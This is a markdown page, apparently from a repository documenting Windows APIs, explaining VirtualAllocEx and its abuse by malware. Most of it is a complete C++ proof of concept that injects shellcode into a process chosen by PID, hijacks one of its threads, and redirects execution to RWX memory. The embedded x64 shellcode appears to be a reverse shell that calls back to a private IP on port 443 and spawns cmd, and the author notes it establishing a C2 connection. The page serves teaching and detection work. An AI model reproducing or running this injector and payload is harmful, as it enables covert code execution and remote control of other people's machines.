# Description

**`VirtualAllocEx`** is a function that is used to allocate memory in the virtual address space of a remote process. It is particularly useful in scenarios where one process needs to write data to another process's memory space. 

Malware can use **`VirtualAllocEx`** to ensure that the memory region allocated in the target process is executable. Once the memory is allocated, malware might use other API functions like **`WriteProcessMemory`** to write executable code into the allocated space.

# Proof of Concept

This sample code injects shellcode into a process. It allocates memory within the target process and writes executable shellcode there, then hijacks a thread from the target process to execute the shellcode. This code sample is originated from: https://www.ired.team/offensive-security/code-injection-process-injection/injecting-to-remote-process-via-thread-hijacking - I've made some small tweaks.

```c
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <string>

int main(int argc, char* argv[])
{
    // Shellcode bytes are usually intended for low-level memory manipulation or process injection.
    unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
        "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
        "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
        "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
        "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
        "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
        "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
        "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
        "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
        "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
        "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
        "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
        "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
        "\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x38\x66\x41\x54"
        "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
        "\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
        "\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
        "\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
        "\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
        "\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
        "\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
        "\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
        "\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
        "\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
        "\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
        "\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
        "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
        "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
        "\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

    // Ensure the correct number of command-line arguments are passed
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <PID>" << std::endl;
        return 1; // Exit with an error code if not
    }

    DWORD targetPID; // This will store the process ID from the command line
    try {
        targetPID = std::stoul(argv[1]); // Convert string argument to a number
    }
    catch (const std::exception& e) {
        std::cerr << "Invalid PID. Please enter a valid number." << std::endl;
        return 1; // Exit with error if conversion fails
    }

    // Open the target process with all access rights
    HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (targetProcessHandle == NULL) {
        std::cerr << "Failed to open target process." << std::endl;
        return 1;
    }

    // Allocate memory in the target process for the shellcode
    PVOID remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        std::cerr << "Failed to allocate memory in target process." << std::endl;
        CloseHandle(targetProcessHandle);
        return 1;
    }

    // Write the shellcode into the allocated memory
    if (!WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, sizeof(shellcode), NULL)) {
        std::cerr << "Failed to write shellcode to target process." << std::endl;
        VirtualFreeEx(targetProcessHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(targetProcessHandle);
        return 1;
    }

    // Create a snapshot of all threads in the system
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create thread snapshot." << std::endl;
        VirtualFreeEx(targetProcessHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(targetProcessHandle);
        return 1;
    }

    // Structure to store thread details
    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
    if (!Thread32First(snapshot, &threadEntry)) { // Retrieve the first thread in the snapshot
        std::cerr << "Failed to get first thread." << std::endl;
        CloseHandle(snapshot);
        VirtualFreeEx(targetProcessHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(targetProcessHandle);
        return 1;
    }

    HANDLE threadHijacked = NULL; // This will store the handle of the thread we need
    // Iterate over all threads until we find one from our target process
    do {
        if (threadEntry.th32OwnerProcessID == targetPID) {
            threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
            if (threadHijacked != NULL) break; // Successfully opened the thread
        }
    } while (Thread32Next(snapshot, &threadEntry));

    if (threadHijacked == NULL) {
        std::cerr << "No matching thread found for the specified PID." << std::endl;
        CloseHandle(snapshot);
        VirtualFreeEx(targetProcessHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(targetProcessHandle);
        return 1;
    }

    // Suspend the chosen thread for context manipulation
    if (SuspendThread(threadHijacked) == (DWORD)-1) {
        std::cerr << "Failed to suspend the thread." << std::endl;
        CloseHandle(threadHijacked);
        CloseHandle(snapshot);
        VirtualFreeEx(targetProcessHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(targetProcessHandle);
        return 1;
    }

    // Prepare to modify thread context to redirect execution
    CONTEXT context = { 0 };
    context.ContextFlags = CONTEXT_FULL; // Full context (all registers)
    if (!GetThreadContext(threadHijacked, &context)) {
        std::cerr << "Failed to get thread context." << std::endl;
        ResumeThread(threadHijacked); // Resume thread on failure
        CloseHandle(threadHijacked);
        CloseHandle(snapshot);
        VirtualFreeEx(targetProcessHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(targetProcessHandle);
        return 1;
    }

    context.Rip = (DWORD_PTR)remoteBuffer; // Change the instruction pointer to the start of the shellcode
    if (!SetThreadContext(threadHijacked, &context)) {
        std::cerr << "Failed to set thread context." << std::endl;
        ResumeThread(threadHijacked);
        CloseHandle(threadHijacked);
        CloseHandle(snapshot);
        VirtualFreeEx(targetProcessHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(targetProcessHandle);
        return 1;
    }

    // Resume the thread to execute the shellcode
    ResumeThread(threadHijacked);
    // Clean up handles
    CloseHandle(threadHijacked);
    CloseHandle(snapshot);
    CloseHandle(targetProcessHandle);

    return 0; // Successful execution
}
```

Here we are injecting shellcode into a specified process:

![image](https://github.com/DebugPrivilege/WindowsAP1/assets/63166600/021dee54-3242-4517-87fd-72707ce14685)


This memory region contains shellcode and is marked as RWX, it suggests that the shellcode might be about to execute or is currently being executed:

![image](https://github.com/DebugPrivilege/WindowsAP1/assets/63166600/fd688880-c9a2-4d5f-8a6b-a0081609a1e9)


To finalize it, we can see that the shellcode is attempting to establish the C2 connection:

![image](https://github.com/DebugPrivilege/WindowsAP1/assets/63166600/82753289-3c7f-43b3-83fa-1e4f6485bf06)

